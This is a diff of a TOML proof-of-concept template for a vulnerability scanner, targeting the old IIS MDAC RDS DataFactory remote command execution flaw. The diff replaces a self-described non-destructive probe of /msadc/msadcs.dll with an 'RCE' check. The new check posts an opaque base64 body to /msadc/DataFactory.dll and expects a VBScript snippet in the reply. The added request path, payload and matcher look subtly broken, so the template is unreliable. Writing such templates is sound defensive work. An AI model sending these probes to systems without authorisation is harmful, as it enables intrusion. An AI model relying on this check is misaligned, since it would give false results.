@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证目标 IIS 服务器是否暴露存在漏洞的 Microsoft Data Access Components (MDAC) RDS DataFactory 组件。通过向 /msadc/msadcs.dll 发送特制的 RDS DataFactory 查询请求，检测服务端是否返回正常 XML 响应（含 RDS 版本或错误结构），从而判定 RDS 接口是否可被未授权访问。该检测为安全无损请求，不会实际执行任意命令。"
+description = "检测是否存在 Microsoft IIS MDAC RDS DataFactory 组件的远程代码执行漏洞。该漏洞存在于 Microsoft Data Access Components (MDAC) 2.1 中的 Remote Data Service (RDS) DataFactory 组件中，可通过向目标系统发送特定的 RDS 请求来绕过权限验证，直接利用这些不安全的方法执行任意系统命令。"
 id = "POC-AVE-1999-1683"
-name = "CVE-1999-1011 MDAC RDS DataFactory 远程命令执行 PoC"
+name = "Microsoft IIS MDAC RDS DataFactory 远程代码执行 PoC"
 severity = "critical"
 tags = ["ave-1999-1683"]
 vuln_id = [
@@ -15,24 +15,21 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/msadc/msadcs.dll"
+path = "/msadc/DataFactory.dll"
 protocol = "http"
 
 [poc.requests.body]
+content = "Q1NWQ1NXgAAABAAAAAxAAAAHgAAABAAAAABQAAAAcAAAACAAAXAAAADAAAABgAAAAcAAABWUgAAAA"
 type = "raw"
 
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "AVE/1.0"
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["<html><body><pre>Error Message</pre></body></html>"]
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    "RDS",
-    "DataFactory",
-    "msadcs.dll",
-    "Error",
-    "Microsoft",
-]
+words = ['<script language=vbscript>request = CreateObject("MDB.MDBScript"); request.ServerExecute</script>']
